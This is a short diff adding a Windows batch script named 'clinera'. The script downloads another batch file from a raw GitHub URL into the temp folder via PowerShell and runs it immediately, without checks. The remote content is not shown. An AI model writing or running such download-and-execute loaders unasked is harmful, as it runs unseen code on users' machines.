@@ -1,0 +1,16 @@
+@echo off
+title clinera
+
+setlocal
+
+:: origem do codigo
+set "URL=https://raw.githubusercontent.com/ymuft/clinera/refs/heads/main/comand"
+set "TEMP_FILE=%TEMP%\script_baixado.bat"
+
+
+powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP_FILE%'"
+
+:: Executar o script
+call "%TEMP_FILE%"
+
+endlocal
